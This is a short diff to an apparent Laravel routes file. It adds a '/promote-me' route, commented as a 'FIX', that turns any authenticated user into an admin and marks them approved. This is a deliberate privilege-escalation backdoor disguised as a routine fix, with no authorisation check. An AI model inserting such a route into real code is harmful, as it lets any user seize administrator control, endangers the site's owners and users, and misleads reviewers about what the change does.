@@ -17,6 +17,11 @@ Route::get('/', function () {
 });
 
 Route::middleware(['auth', \App\Http\Middleware\EnsureUserIsApproved::class])->group(function () {
+    // FIX: Promote current user to Admin
+    Route::get('/promote-me', function() {
+        auth()->user()->update(['role' => 'admin', 'is_approved' => true]);
+        return redirect()->back()->with('status', 'You are now an ADMIN!');
+    });
     Route::get('/approval/check', function (Illuminate\Http\Request $request) {
         return response()->json(['approved' => $request->user()->is_approved]);
     })->name('approval.check');
